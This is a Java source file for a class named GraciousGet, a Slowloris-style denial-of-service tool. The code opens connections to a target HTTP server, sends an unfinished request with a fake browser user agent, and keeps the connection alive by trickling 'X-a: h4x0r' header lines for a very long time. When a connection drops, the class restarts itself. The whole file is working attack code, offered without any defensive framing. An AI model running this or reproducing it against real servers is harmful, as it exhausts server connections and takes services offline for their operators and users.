package m3rlin.g3t;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Date;

public class GraciousGet implements Runnable {
	
	private Thread thread;
	private String hostname;
	private int port;
	private int interval;
	private Socket socket;
	private BufferedWriter writer;

	public GraciousGet(String hostname, int port, int interval) {
		this.hostname = hostname;
		this.port = port;
		this.interval = interval;
	}
	
   public void start() { 
    	if (thread == null) { 
    		thread = new Thread(this);
    		thread.start();    		
        }
    }
	
	public void run() {
		try {
			System.out.println(new Date() + " | " + Thread.currentThread().getName() + " - start");

			socket = new Socket(InetAddress.getByName(hostname), port);
			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));

			writer.write("GET / HTTP/1.1\r\n");
			writer.write("Host: " + hostname + " \r\n");
			// generate random user agents
			writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
			// generate random content-lengths
			writer.write("Content-Length: 1000000\r\n");
			writer.write("Connection: Keep-Alive\r\n");
			writer.write("X-a:\r\n");
			writer.flush();
			for (int i = 0; i < 100000000; i++) {
				writer.write("X-a: h4x0r\r\n");
				writer.flush();
				try {
					Thread.sleep(interval);
				} catch (InterruptedException e) {
					System.out.println("Thread can't sleep");
				}
			}
			writer.close();
			socket.close();
			System.out.println(new Date() + " | " + Thread.currentThread().getName() + " - finished");
			start();
		} catch (UnknownHostException e) {
			System.out.println("Thread died. The hostname could not be resolved.");
			try {
				socket.close();				
			} catch (IOException e1) { }
			start();
		} catch (ConnectException e) {
			System.out.println("Thread died from connection error. Check that there is an HTTP server and the port is correct.");
			try {
				socket.close();				
			} catch (IOException e1) { }
			start();
		} catch (SocketException e) {
			System.out.println("Thread had a socket error; attempting to rebuild.");
			try {
				socket.close();				
			} catch (IOException e1) { }
			start();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}